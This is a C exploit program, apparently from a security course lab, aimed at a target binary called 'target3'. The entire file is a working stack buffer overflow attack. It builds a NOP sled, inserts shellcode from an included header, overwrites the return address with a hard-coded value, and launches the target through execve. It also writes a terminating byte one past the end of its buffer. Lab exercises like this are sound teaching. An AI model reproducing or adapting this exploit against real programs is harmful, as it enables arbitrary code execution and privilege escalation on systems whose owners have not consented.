#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define NOP    '\x90'
#define OFBUFLENGTH 72

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char overflowBuf[OFBUFLENGTH];
	int shellcodeSize = sizeof(shellcode)-1;
	// Avoid null terminating char in the string 

	int i;
	char RPAddr[]="\x20\x21\xfe\x18";
	
	for (i=0; i<OFBUFLENGTH; i++)
		overflowBuf[i] = NOP;
	for(i=0; i < shellcodeSize; i++)
		overflowBuf[i+4] = shellcode[i];
	
	int RPEndAddrInBuf = OFBUFLENGTH -1;
	for(i=0; i < 4; i++)
		overflowBuf[RPEndAddrInBuf-i] = RPAddr[i];
	overflowBuf[OFBUFLENGTH]='\x00';

	args[0] = TARGET;
	args[1] = overflowBuf;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
